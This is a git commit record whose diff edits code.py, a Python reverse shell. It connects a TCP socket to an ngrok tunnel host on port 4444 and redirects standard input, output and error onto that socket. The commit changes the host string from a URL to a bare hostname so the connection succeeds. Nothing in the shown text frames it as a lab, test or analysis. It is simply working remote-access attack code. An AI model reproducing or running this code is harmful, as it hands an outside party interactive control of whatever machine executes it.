c7a571db0ed9807cb11266b332880c112b5d9d8d
YuriCyberDeveloper <66189089+YuriDev1669@users.noreply.github.com>
2025-12-13 22:52:22 -0300

    Update socket connection URL in code.py

--- code.py
+++ code.py
@@ -4,7 +4,7 @@ import os
 import pty
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("https://0098e90c3898.ngrok-free.app", 4444))
+s.connect(("0098e90c3898.ngrok-free.app", 4444))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
